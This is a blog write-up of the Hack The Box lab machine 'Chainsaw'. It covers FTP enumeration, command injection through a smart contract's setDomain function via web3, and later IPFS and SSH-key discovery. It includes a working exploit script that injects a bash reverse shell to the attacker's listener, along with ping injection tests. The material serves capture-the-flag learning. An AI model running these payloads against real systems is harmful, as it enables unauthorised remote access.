---
layout: post
title:  "Hack The Box: 'Chainsaw' Writeup"
image: ''
date:   2019-11-23 00:11:43
tags:
- hackthebox
- blockchain
- smart-contracts
- linux
- python
- solidity
- web3
- manual-exploit

description: ''
categories:
- Hack The Box
---

<style>

#myBtn {
  display: none;
  position: fixed;
  bottom: 40px;
  right: 50px;
  z-index: 99;
  font-size: 12px;
  border: 1px solid black;
  outline: black;
  background-color: #262626;
  color: white;
  cursor: pointer;
  padding: 10px 22px 10px 22px;
  border-radius: 10px;
  font-family: 'Open Sans';
}

#myBtn:hover {
  background-color: #5d4d7a;
}

applause-button {
		margin: auto;
	}

	.header-site .site-title {
      	padding-top: 5px;
      	color: white;
      	text-align: center;
      	font-weight: bold;
      	padding-left: 19px;
	}
	
	.fortune-img {
		max-width: 75%;
	}

	.post-content img { 
		margin: 1.875rem auto;
		display: block;
	}
</style>

<button onclick="topFunction()" id="myBtn" title="Go to top">↑</button>

<script>
// When the user scrolls down 20px from the top of the document, show the button
window.onscroll = function() {scrollFunction()};

function scrollFunction() {
  if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
    document.getElementById("myBtn").style.display = "block";
  } else {
    document.getElementById("myBtn").style.display = "none";
  }
}

// When the user clicks on the button, scroll to the top of the document
function topFunction() {
  document.body.scrollTop = 0;
  document.documentElement.scrollTop = 0;
}
</script>

<!-- add the button style & script -->
<link rel="stylesheet" href="/assets/css/applause-button.css" />
<script src="/assets/js/applause-button.js"></script>

<img src="/assets/img/writeups/HTB-CHAINSAW/HTB-CHAINSAW-BADGE.PNG" class="chainsaw-img" alt="Hack The Box - Chainsaw">

### Preface

If you find anything in this writeup you feel is inaccurately depicted and/or explained, please reach out to me and let me know! I am always willing to make corrections in order to provide the most accurate information possible, while also taking the opportunity to learn and grow. Thanks!

### Overview

The `Chainsaw` machine on Hack The Box (created by <a href="https://www.hackthebox.eu/home/users/profile/41600">artikrh</a> and <a href="https://www.hackthebox.eu/home/users/profile/37317">absolutezero</a>) is a retired 40 point Linux machine. The initial steps require manual exploitation of smart contracts via a few files that can be found in an FTP share with `anonymous` login enabled. Once a shell has been obtained, there is a privilege escalation technique involving the InterPlanetary File System (`IPFS`) which leads to SSH key cracking (and eventually `user.txt`). For root, there is a 64-bit ELF setuid binary called `ChainsawClub` which can be exploited in a similar fashion to the first exploit.
<p><br></p>
With all of that being said... Time to get crackin'! 
<p><br></p>

As usual, I started with my initial `nmap` scan for general port discovery and service enumeration.
<p><br></p>

### Nmap Scan

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+[root@kali: HTB-CHAINSAW]$ nmap -p- -sCV -A -Pn 10.10.10.142 > nmap_scan_full_chainsaw.nmap
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-23 13:36 EST
Nmap scan report for 10.10.10.142
Host is up (0.037s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 1001     1001        23828 Dec 05  2018 WeaponizedPing.json
| -rw-r--r--    1 1001     1001          243 Dec 12  2018 WeaponizedPing.sol
|_-rw-r--r--    1 1001     1001           44 Nov 23 17:17 address.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.34
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.7p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 02:dd:8a:5d:3c:78:d4:41:ff:bb:27:39:c1:a2:4f:eb (RSA)
|   256 3d:71:ff:d7:29:d5:d4:b2:a6:4f:9d:eb:91:1b:70:9f (ECDSA)
|_  256 7e:02:da:db:29:f9:d2:04:63:df:fc:91:fd:a2:5a:f2 (ED25519)
9810/tcp open  unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 400 Bad Request
|     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: *
|     Content-Type: text/plain
|     Date: Sat, 23 Nov 2019 18:37:25 GMT
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.1 400 Bad Request
|     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: *
|     Content-Type: text/plain
|     Date: Sat, 23 Nov 2019 18:37:24 GMT
|     Connection: close
|     Request
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: *
|     Content-Type: text/plain
|     Date: Sat, 23 Nov 2019 18:37:24 GMT
|_    Connection: close
</code></pre></div></div>

### FTP Enumeration

I immediately noticed there was an FTP server with `anonymous` login allowed, so I checked that first using `ftp`. There were a few files there, so I went ahead and grabbed all of them.

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+[root@kali: HTB-CHAINSAW]$ ftp 10.10.10.142
Connected to 10.10.10.142.
220 (vsFTPd 3.0.3)
Name (10.10.10.142:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
+ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001        23828 Dec 05  2018 WeaponizedPing.json
-rw-r--r--    1 1001     1001          243 Dec 12  2018 WeaponizedPing.sol
-rw-r--r--    1 1001     1001           44 Nov 23 17:17 address.txt
226 Directory send OK.
+ftp> mget *
+mget WeaponizedPing.json? 
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for WeaponizedPing.json (23828 bytes).
226 Transfer complete.
23828 bytes received in 0.04 secs (526.2219 kB/s)
+mget WeaponizedPing.sol? 
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for WeaponizedPing.sol (243 bytes).
226 Transfer complete.
243 bytes received in 0.00 secs (2.3891 MB/s)
+mget address.txt? 
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for address.txt (44 bytes).
226 Transfer complete.
44 bytes received in 0.00 secs (343.7500 kB/s)
</code></pre></div></div>

The contents of the files are as follows:

`WeaponizedPing.json`:

```json
+[root@kali: HTB-CHAINSAW]$ cat WeaponizedPing.json
{
  "contractName": "WeaponizedPing",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "getDomain",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_value",
          "type": "string"
        }
      ],
      "name": "setDomain",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526040805190810160405280600a81526020017f676f6f676c652e636f6d000000000000000000000000000000000000000000008152506000908051906020019061004f929190610062565b5034801561005c57600080fd5b50610107565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106100a357805160ff19168380011785556100d1565b828001600101855582156100d1579182015b828111156100d05782518255916020019190600101906100b5565b5b5090506100de91906100e2565b5090565b61010491905b808211156101005760008160009055506001016100e8565b5090565b90565b6102d7806101166000396000f30060806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063b68d180914610051578063e5eab096146100e1575b600080fd5b34801561005d57600080fd5b5061006661014a565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100a657808201518184015260208101905061008b565b50505050905090810190601f1680156100d35780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156100ed57600080fd5b50610148600480360381019080803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192905050506101ec565b005b606060008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156101e25780601f106101b7576101008083540402835291602001916101e2565b820191906000526020600020905b8154815290600101906020018083116101c557829003601f168201915b5050505050905090565b8060009080519060200190610202929190610206565b5050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061024757805160ff1916838001178555610275565b82800160010185558215610275579182015b82811115610274578251825591602001919060010190610259565b5b5090506102829190610286565b5090565b6102a891905b808211156102a457600081600090555060010161028c565b5090565b905600a165627a7a72305820d5d4d99bdb5542d8d65ef822d8a98c80911c2c3f15d609d10003ccf4227858660029",
  "deployedBytecode": "0x60806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063b68d180914610051578063e5eab096146100e1575b600080fd5b34801561005d57600080fd5b5061006661014a565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100a657808201518184015260208101905061008b565b50505050905090810190601f1680156100d35780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156100ed57600080fd5b50610148600480360381019080803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192905050506101ec565b005b606060008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156101e25780601f106101b7576101008083540402835291602001916101e2565b820191906000526020600020905b8154815290600101906020018083116101c557829003601f168201915b5050505050905090565b8060009080519060200190610202929190610206565b5050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061024757805160ff1916838001178555610275565b82800160010185558215610275579182015b82811115610274578251825591602001919060010190610259565b5b5090506102829190610286565b5090565b6102a891905b808211156102a457600081600090555060010161028c565b5090565b905600a165627a7a72305820d5d4d99bdb5542d8d65ef822d8a98c80911c2c3f15d609d10003ccf4227858660029",
  "sourceMap": "27:210:1:-;;;56:27;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;27:210;8:9:-1;5:2;;;30:1;27;20:12;5:2;27:210:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;:::o;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;:::o;:::-;;;;;;;",
  "deployedSourceMap": "27:210:1:-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;88:75;;8:9:-1;5:2;;;30:1;27;20:12;5:2;88:75:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;23:1:-1;8:100;33:3;30:1;27:10;8:100;;;99:1;94:3;90:11;84:18;80:1;75:3;71:11;64:39;52:2;49:1;45:10;40:15;;8:100;;;12:14;88:75:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;166:68;;8:9:-1;5:2;;;30:1;27;20:12;5:2;166:68:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;88:75;130:6;153:5;146:12;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;88:75;:::o;166:68::-;223:6;215:5;:14;;;;;;;;;;;;:::i;:::-;;166:68;:::o;27:210::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;:::o;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;:::o",
  "source": "pragma solidity ^0.4.24;\n\n\ncontract WeaponizedPing {\n\n  string store = \"google.com\";\n\n  function getDomain() public view returns (string) {\n      return store;\n  }\n  function setDomain(string _value) public {\n      store = _value;\n  }\n\n}\n\n",
  "sourcePath": "/opt/WeaponizedPing/WeaponizedPing.sol",
  "ast": {
    "absolutePath": "/opt/WeaponizedPing/WeaponizedPing.sol",
    "exportedSymbols": {
      "WeaponizedPing": [
        80
      ]
    },
----------
 Redacted
----------
  "networks": {
    "1543936419890": {
      "events": {},
      "links": {},
      "address": "0xaf6ce61d342b48cc992820a154fe0f533e5e487c",
      "transactionHash": "0x5e94c662f1048fca58c07e16506f1636391f757b07c1b6bb6fbb4380769e99e1"
    }
  },
  "schemaVersion": "2.0.1",
  "updatedAt": "2018-12-04T15:24:57.205Z"
}
```

`WeaponizedPing.sol`:

```javascript
+[root@kali: HTB-CHAINSAW]$ cat WeaponizedPing.sol 
pragma solidity ^0.4.24;

contract WeaponizedPing 
{
  string store = "google.com";

  function getDomain() public view returns (string) 
  {
      return store;
  }

  function setDomain(string _value) public 
  {
      store = _value;
  }
}
```

`address.txt`:

```
0xC727e70ded24b8D814627B53ce95cA4cF1d3e2C7
```

### WeaponizedPing File Contents & Analysis

This appears to be exactly what is needed to produce a smart contract. These smart contracts are written in a language called Solidity -- most people tend to associate it with popular blockchain platforms, such as Ethereum. 
<p><br></p>
The smart contract `WeaponizedPing.sol` appears to have two interesting functions as well, both of which are returning the same value (`store`).
<p><br></p>

The first function is `getDomain()`. It returns the value of `store`, where the value of `store` is set to `google.com`.

```javascript
contract WeaponizedPing 
{
  string store = "google.com";

  function getDomain() public view returns (string) 
  {
      return store;
  }
```

The second function is `setDomain`, which takes the input of *some string value* (`_value`) and changes the original value of `store` to the new *some string value* (`_value`):

```javascript
  function setDomain(string _value) public 
  {
      store = _value;
  }
```

### Smart Contract Exploit Verification

So from here, I began writing my exploit to try and get an initial shell from the smart contract code already provided.
<p><br></p>
I started by importing required modules with `python`. I initially had to install `web3` 
prior to importing it with python, so I went ahead and did that first:

```python
pip3 install web3
```

I then imported `web3` as it's a required module to interact with the smart contracts, as well as `HTTPProvider`, as I received quite a few HTTP response headers when I ran my initial `nmap` scan, so I figured it would be safe to include at this stage:

```python
from web3 import Web3, HTTPProvider
```

I also imported `json` because it is necessary to import the application binary interface, which happens to be a `json` file (`WeaponizedPing.json`).

```python
import json
```

I then went ahead and specified my first variable, which is `url`. I set `url` to the machine IP with port `9810` appended to it, since this is the port we will be using to communicate with the Ethereum client on:

```python
url = "http://10.10.10.142:9810"
```

Next, I created a `web3` variable to initiate a web connection:

```python
web3 = Web3(Web3.HTTPProvider(url))
```

Finally, I added a `print()` statement to make sure I was connecting properly, which I later removed as it was no longer needed. This step is simply to ensure the connection is being made before moving forward:

```python
+>>> print(web3.isConnected())
True
```

So now that `web3.isConnected()` returned `True`, I began attempting to exploit the service.
<p><br></p>

### Smart Contract Exploitation

I hop into a `python3` window and get started with building my exploit. I begin by assigning the necessary parameters to communicate with the smart contract service:

```python
➜  HTB-CHAINSAW python3
Python 3.7.5 (default, Oct 27 2019, 15:43:29) 
[GCC 9.2.1 20191022] on linux
Type "help", "copyright", "credits" or "license" for more information.
+>>> from web3 import Web3, HTTPProvider
+>>> import json
+>>> 
+>>> # Basic configuration variables related to smart contract verification
+... 
+>>> contract_address = '0xC727e70ded24b8D814627B53ce95cA4cF1d3e2C7'
+>>> contract_data = json.loads(open("WeaponizedPing.json", "r").read())
+>>> abi = contract_data['abi']
+>>> 
+>>> # Connection gets established
+... 
+>>> w3 = Web3(HTTPProvider('http://10.10.10.142:9810'))
+>>> w3
<web3.main.Web3 object at 0x7fd66445de90>
```

From here, I can run `w3.eth.accounts` to achieve this output:

```python
['0x661739A860ca8b1325eA416be0E0342d1990B798', '0xE14A7540Dc365da93226e028f078201b95acbE95', '0x0F49c298997a03F7bf7666Bd05faBa483286F460', '0xC29A0F194b565D6bc20Cf58e5Ef5bB6dec58bF03', '0x5c0Fd628150215AC44eacA004FfB2AAb120035D4', '0x7Ed923F73D8C8b0C7382B871071a4b26F1542799', '0x3ef2DE965A8952e6FF5720458DA6FaDbe3210613', '0x9AA54F55b1510332b798F1cdf8EA7AECf4cB4c1D', '0x534C34980A4Fd8D3eC97850c1D5e7934786E477f', '0x8E267A00719B13a372c12946CF391B247AfB91FE']
```

And this will display all of the available addresses associated with `accounts`. So, for example, I can grab the first one:

```python
+>>> w3.eth.accounts[0]
'0x661739A860ca8b1325eA416be0E0342d1990B798'
```

Or maybe the second one:

```python
+>>> w3.eth.accounts[1]
'0xE14A7540Dc365da93226e028f078201b95acbE95'
```

Or even the thir-
<p><br></p>

You get the point. From here, I went ahead and set my `defaultAccount` to the very first address in the list:

```python
+>>> w3.eth.defaultAccount = w3.eth.accounts[0]
```

Nice – So now, every time I perform a transaction, the address located at `w3.eth.accounts[0]` will be applied as the default sending address (aka, this address --> `0x661739A860ca8b1325eA416be0E0342d1990B798`)
<p><br></p>

This is great and all, but I can't really *call* anything yet. However, this is why I created the `abi` variable. After checking the Solidity documentation, I noticed I needed two things to interact with smart contracts:
<p><br></p>

1) The address of the contract (which I already found in `WeaponizedPing.json`)<br>
2) The `ABI`, or *Application Binary Interface* of the contract
<p><br></p>

This will essentially "load" the API and allow me to interact with it. I can do this by running this command in `python`:

```python
+>>> contract = w3.eth.contract(abi=abi, address=contract_address)
```

And as you can see, checking the value of `contract ` gives me this result:

```python
+>>> contract
<web3._utils.datatypes.Contract object at 0x7fd664432250>
```

Looking good so far! Now I can try playing with the associated functions from `WeaponizedPing.sol`, which are `getDomain` and `setDomain`:

```python
+>>> contract.functions.getDomain().call()
'google.com'
```

Cool! It gives me the output `google.com`, which is exactly what I would expect, as that was already defined in the original source code.
<p><br></p>

So this got me thinking... Instead of using `getDomain()` to retrieve a domain, what if I were to use `setDomain` instead and try to ping myself? So that's exactly what I did.
<p><br></p>

I went ahead and ran `tcpdump` in order to (hopefully) receive a request back to myself via the smart contract exploit.

I ran this command to get `tcpdump` running:

```python
➜  www tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
```

An inferance can be made that, because the original file is called `WeaponizedPing`, it's likely that it will be accessible via ICMP.
<p><br></p>

Anyway, I then ran this command from my `python` prompt to retrieve a response:

```python
+>>> contract.functions.setDomain("10.10.14.34").transact()
HexBytes('0x081c2b06307116751929679abef5cf16a64c3912ee9b6f3cd58eec8bb7731e50')
```

Which returned this output in `tcpdump`:

```python
➜  www tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
19:14:26.706416 IP 10.10.10.142 > 10.10.14.34: ICMP echo request, id 1837, seq 1, length 64
19:14:26.706444 IP 10.10.14.34 > 10.10.10.142: ICMP echo reply, id 1837, seq 1, length 64
```

I knew I could get a response, but I wanted to verify this one step further.
<p><br></p>

I wanted to know if I could get command execution in a similar fashion. I attempted to do this by `ping`ing myself directly with a similar command. I achieved this by running the same `tcpdump` command, but by changing my original smart contract command to this:

```python
+>>> contract.functions.setDomain("10.10.14.34; ping -c 5 10.10.14.34").transact()
```

With this command, my `tcpdump` achieved this response:

```python
➜  www tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes

19:22:42.440642 IP 10.10.10.142 > 10.10.14.34: ICMP echo request, id 1844, seq 1, length 64
19:22:42.440670 IP 10.10.14.34 > 10.10.10.142: ICMP echo reply, id 1844, seq 1, length 64

19:22:42.484806 IP 10.10.10.142 > 10.10.14.34: ICMP echo request, id 1845, seq 1, length 64
19:22:42.484837 IP 10.10.14.34 > 10.10.10.142: ICMP echo reply, id 1845, seq 1, length 64

19:22:43.486595 IP 10.10.10.142 > 10.10.14.34: ICMP echo request, id 1845, seq 2, length 64
19:22:43.486618 IP 10.10.14.34 > 10.10.10.142: ICMP echo reply, id 1845, seq 2, length 64

19:22:44.487996 IP 10.10.10.142 > 10.10.14.34: ICMP echo request, id 1845, seq 3, length 64
19:22:44.488015 IP 10.10.14.34 > 10.10.10.142: ICMP echo reply, id 1845, seq 3, length 64

19:22:45.489770 IP 10.10.10.142 > 10.10.14.34: ICMP echo request, id 1845, seq 4, length 64
19:22:45.489808 IP 10.10.14.34 > 10.10.10.142: ICMP echo reply, id 1845, seq 4, length 64

19:22:46.491826 IP 10.10.10.142 > 10.10.14.34: ICMP echo request, id 1845, seq 5, length 64
19:22:46.491846 IP 10.10.14.34 > 10.10.10.142: ICMP echo reply, id 1845, seq 5, length 64
```

I've broken the responses up to make it more apparent, but as you can see, there are clearly five (5) responses present here, exactly as I specified with my previous `ping` command.

### Obtaining A Shell

Now that I have crafted a working payload, I can attempt to obtain a shell given what I already know.
<p><br></p>

I opted for the "easy" route, and settled with a `bash` reverse shell. I set up a `netcat` listener on port `9001` with this command: 

```python
nc -lnvp 9001
```

I then proceeded to obtain a shell on that port with this command in my `python` session:

```python
+>>> contract.functions.setDomain("10.10.14.34; bash -c 'bash -i >& /dev/tcp/10.10.14.34/9001 0>&1'").transact()
HexBytes('0x956acbf29a79038db60787bed29bcb808f03d68ec1c815852e9f5f88538c3d29')
```

Et...

```python
➜  www nc -lnvp 9001
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

Voilà!

```python
➜  www nc -lnvp 9001
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.142.
Ncat: Connection from 10.10.10.142:37282.
bash: cannot set terminal process group (1529): Inappropriate ioctl for device
bash: no job control in this shell
administrator@chainsaw:/opt/WeaponizedPing$
```

I managed to obtain a shell as `administrator`! I assumed I would be able to read `user.txt` at this point, but I was wrong... It appears there is a second user named `bobby`, which is likely the user with access to the `user.txt` file.
<p><br></p>

With this in mind, I decided I should probably start digging deeper... But I wanted a better shell first, so I generated my own ssh keypair to establish persistence as `administrator` prior to continuing with my enumeration.
<p><br></p>

#### Sidenote

Here is the finalized `exploit.py` I used to obtain my shell as well:

```python
from web3 import Web3, HTTPProvider
import json

# Basic configuration variables related to smart contract verification

cAddress = '0xC727e70ded24b8D814627B53ce95cA4cF1d3e2C7' # address.txt
jsonData = json.loads(open("WeaponizedPing.json", "r").read()) # reads data from .json file
abi = jsonData['abi'] # sets abi from data

# Web3 connection established to endpoint
w3 = Web3(HTTPProvider('http://10.10.10.142:9810'))
w3.eth.defaultAccount = w3.eth.accounts[0]

# Specify contract values 
contract = w3.eth.contract(abi=abi, address=cAddress) # enables 'functions' i.e. contracts.functions.<functionName>()
contract.functions.setDomain("10.10.14.34; bash -c 'bash -i >& /dev/tcp/10.10.14.34/9001 0>&1'").transact() # calls shell to listener
```

I believe it is worth noting that I personally ran the command:

```
contract.functions.setDomain("10.10.14.34; ping -c 5 10.10.14.34").transact()
```

Along with my `tcpdump` in order to first verify that I could receive a connection, and then I ran:

```
contract.functions.setDomain("10.10.14.34; bash -c 'bash -i >& /dev/tcp/10.10.14.34/9001 0>&1'").transact()
```

I did not run the exploit directly with `python` either. Instead, I ran `python3` and then copy and pasted everything contained in `exploit.py` and ran it all manually from my `python` terminal. I'm sure there is a way to autopwn the first hurdle, but I haven't taken the time to write anything for it so far.

<p><br></p>

Now, back to having persistence as `administrator`!

### System Enumeration & User.txt

Equipped with my new and improved SSH shell, I began sifting through directories to see what I could find.
<p><br></p>

Upon navigating to `/home/administrator`, I found an interesting folder called `maintain`:

```python
administrator@chainsaw:~$ ls -al
total 112
drwxr-x--- 10 administrator administrator  4096 Dec 20 00:48 .
drwxr-xr-x  4 root          root           4096 Dec 12  2018 ..
lrwxrwxrwx  1 administrator administrator     9 Dec 12  2018 .bash_history -> /dev/null
-rw-r-----  1 administrator administrator   220 Dec 12  2018 .bash_logout
-rw-r-----  1 administrator administrator  3771 Dec 12  2018 .bashrc
drwx------  2 administrator administrator  4096 Dec 20 00:48 .cache
-rw-r-----  1 administrator administrator   220 Dec 20  2018 chainsaw-emp.csv
drwx------  3 administrator administrator  4096 Dec 20 00:48 .gnupg
drwxrwxr-x  5 administrator administrator  4096 Jan 23  2019 .ipfs
drwxr-x---  3 administrator administrator  4096 Dec 12  2018 .local
drwxr-x---  3 administrator administrator  4096 Dec 13  2018 maintain <--- right here!
drwxr-x---  2 administrator administrator  4096 Dec 12  2018 .ngrok2
-rw-r-----  1 administrator administrator   807 Dec 12  2018 .profile
drwxr-x---  2 administrator administrator  4096 Dec 20 00:48 .ssh
drwxr-x---  2 administrator administrator  4096 Dec 12  2018 .swt
-rw-r-----  1 administrator administrator  1739 Dec 12  2018 .tmux.conf
-rw-r-----  1 administrator administrator 45152 Dec 12  2018 .zcompdump
lrwxrwxrwx  1 administrator administrator     9 Dec 12  2018 .zsh_history -> /dev/null
-rw-r-----  1 administrator administrator  1295 Dec 12  2018 .zshrc
```

Inside the `maintain` folder, there was another folder called `pub` and a file called `gen.py`:

```python
administrator@chainsaw:~/maintain$ ls -al
total 16
drwxr-x---  3 administrator administrator 4096 Dec 13  2018 .
drwxr-x--- 10 administrator administrator 4096 Dec 20 00:48 ..
-rwxr-x---  1 administrator administrator  649 Dec 13  2018 gen.py
drwxrwxr-x  2 administrator administrator 4096 Dec 13  2018 pub
```

The contents of `gen.py` are as follows:

```python
#!/usr/bin/python
from Crypto.PublicKey import RSA
from os import chmod
import getpass

def generate(username,password):
	key = RSA.generate(2048)
	pubkey = key.publickey()

	pub = pubkey.exportKey('OpenSSH')
	priv = key.exportKey('PEM',password,pkcs=1)

	filename = "{}.key".format(username)

	with open(filename, 'w') as file:
		chmod(filename, 0600)
		file.write(priv)
		file.close()

	with open("{}.pub".format(filename), 'w') as file:
		file.write(pub)
		file.close()

	# TODO: Distribute keys via ProtonMail

if __name__ == "__main__":
	while True:
		username = raw_input("User: ")
		password = getpass.getpass()
		generate(username,password)
```

The sub-directory called `pub` contains public keys belonging to some other users on the system, one of which is also `bobby`:

```python
administrator@chainsaw:~/maintain$ cd pub && ls -al
total 28
drwxrwxr-x 2 administrator administrator 4096 Dec 13  2018 .
drwxr-x--- 3 administrator administrator 4096 Dec 13  2018 ..
-rw-rw-r-- 1 administrator administrator  380 Dec 13  2018 arti.key.pub
-rw-rw-r-- 1 administrator administrator  380 Dec 13  2018 bobby.key.pub
-rw-rw-r-- 1 administrator administrator  380 Dec 13  2018 bryan.key.pub
-rw-rw-r-- 1 administrator administrator  380 Dec 13  2018 lara.key.pub
-rw-rw-r-- 1 administrator administrator  380 Dec 13  2018 wendy.key.pub
```

This was interesting to me, so I continued my exploration. I found another directory in `/home/administrator` called `.ipfs`. Curious as to what this was, I went ahead and Google'd it, and was immediately greeted with this information:

<img src="/assets/img/writeups/HTB-CHAINSAW/IPFS.PNG" class="chainsaw-img" alt="Google - Interplanetary File System">

After reading some further <a href="https://docs.ipfs.io/reference/api/cli/">`CLI documentation`</a> on `IPFS`, I found I could use the `ipfs refs local` command to list existing local references:

```python
administrator@chainsaw:~/.ipfs$ ipfs refs local
QmYCvbfNbCwFR45HiNP45rwJgvatpiW38D961L5qAhUM5Y
QmPctBY8tq2TpPufHuQUbe2sCxoy2wD5YRB6kdce35ZwAx
QmbwWcNc7TZBUDFzwW7eUTAyLE2hhwhHiTXqempi1CgUwB
QmdL9t1YP99v4a2wyXFYAQJtbD9zKnPrugFLQWXBXb82sn
QmSKboVigcD3AY4kLsob117KJcMHvMUu6vNFqk1PQzYUpp
QmUHHbX4N8tUNyXFK9jNfgpFFddGgpn72CF1JyNnZNeVVn
QmegE6RZe59xf1TyDdhhcNnMrsevsfuJHUynLuRc4yf6V1
QmWSLAHhiNVRMFMv4bnE7fqq9E74RtXTRm9E1QVo37GV9t
QmPjsarLFBcY8seiv3rpUZ2aTyauPF3Xu3kQm56iD6mdcq
QmZrd1ik8Z2F5iSZPDA2cZSmaZkHFEE4jZ3MiQTDKHAiri
[...]
QmSyJKw6U6NaXupYqMLbEbpCdsaYR5qiNGRHjLKcmZV17r
QmZZRTyhDpL5Jgift1cHbAhexeE1m2Hw8x8g7rTcPahDvo
QmUH2FceqvTSAvn6oqm8M49TNDqowktkEx4LgpBx746HRS
QmcMCDdN1qDaa2vaN654nA4Jzr6Zv9yGSBjKPk26iFJJ4M
QmPZ9gcCEpqKTo6aq61g2nXGUhM4iCL3ewB6LDXZCtioEB
Qmc7rLAhEh17UpguAsEyS4yfmAbeqSeSEz4mZZRNcW52vV
```

I began running `ipfs ls <hash>` in an attempt to obtain some more information. Through quite a few phases of trial and error, I landed on this particular hash:
`QmZrd1ik8Z2F5iSZPDA2cZSmaZkHFEE4jZ3MiQTDKHAiri`
<p><br></p>

Which returned multiple `.eml` files:

```python
administrator@chainsaw:~/.ipfs$ ipfs ls QmZrd1ik8Z2F5iSZPDA2cZSmaZkHFEE4jZ3MiQTDKHAiri
QmbwWcNc7TZBUDFzwW7eUTAyLE2hhwhHiTXqempi1CgUwB 10063 artichain600-protonmail-2018-12-13T20_50_58+01_00.eml
QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF 4640  bobbyaxelrod600-protonmail-2018-12-13-T20_28_54+01_00.eml
QmZxzK6gXioAUH9a68ojwkos8EaeANnicBJNA3TND4Sizp 10084 bryanconnerty600-protonmail-2018-12-13T20_50_36+01_00.eml
QmegE6RZe59xf1TyDdhhcNnMrsevsfuJHUynLuRc4yf6V1 10083 laraaxelrod600-protonmail-2018-12-13T20_49_35+01_00.eml
QmXwXzVYKgYZEXU1dgCKeejT87Knw9nydGcuUZrjwNb2Me 10092 wendyrhoades600-protonmail-2018-12-13T20_50_15+01_00.eml
```

